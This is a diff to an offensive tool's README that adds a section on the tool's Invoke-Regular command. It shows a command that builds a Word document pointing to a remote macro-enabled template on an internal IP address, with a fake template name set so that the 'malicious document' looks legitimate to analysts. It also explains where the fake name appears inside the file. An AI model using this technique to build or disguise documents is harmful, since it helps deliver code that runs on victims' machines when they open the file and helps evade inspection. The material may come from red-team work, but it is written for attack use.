@@ -123,6 +123,22 @@ From debugging prespective, if you connvert the malicious docx to zip archive an
 
 #### Invoke-Regular Example 2
 
+From an OPSEC perspective, you can use `-TemplateName` in conjunction with the `Invoke-Regular` module. This will make your malicious document appear more legitimate if someone try to analyze it.
+
+Here is an example:
+
+```
+Invoke-Regular -InputDoc C:\Users\User\Desktop\Doc1.docx -Link "http://192.168.1.3:8080/Doc1.docm" -Output Legittemplate.dotx
+```
+
+Outcome:
+
+![Invoke-Regular-Example-2](/Pictures/Invoke-Regular-Example2.png)
+
+From debugging prespective, if you connvert the malicious docx to zip archive and go into /docProps/app.xml, you can see the fake template name:
+
+![Invoke-Regular-Fake-Template-Name](/Pictures/Invoke-Regular-Fake-Template-Name.png)
+
 ### Invoke-Identify
 
 ## References
